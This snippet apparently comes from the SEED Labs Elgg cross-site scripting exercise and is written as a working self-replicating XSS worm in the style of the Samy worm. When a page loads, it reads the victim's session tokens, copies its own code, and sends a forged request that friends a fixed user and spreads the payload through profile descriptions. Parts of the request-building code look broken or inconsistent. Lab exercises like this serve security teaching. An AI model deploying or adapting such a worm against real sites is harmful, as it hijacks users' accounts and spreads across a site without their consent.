<script id="worm" type="text/javascript">

window.onload = function(){

	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";

	var guid = "&guid=" + elgg.session.user.guid;
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        var tokenc = "__elgg_token=" + elgg.security.token.__elgg_token;
	var name = "&name=" + elgg.session.user.name;
        var namec = "name=" + elgg.session.user.name;
	
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	
	// Samy friend request
	var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + token + ts;
	// Content
	//var content = token + ts + "&name=" + name + "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2" + guid;  
       var content =  "http://www.seed-server.com/profile/"+ namec + "/edit?=" + tokenc + ts + "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2" + guid;
	
	var samyGuid = 59;
	if (elgg.session.user.guid != samyGuid){
		var Ajax=null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send(content);

	}
}
	
</script>


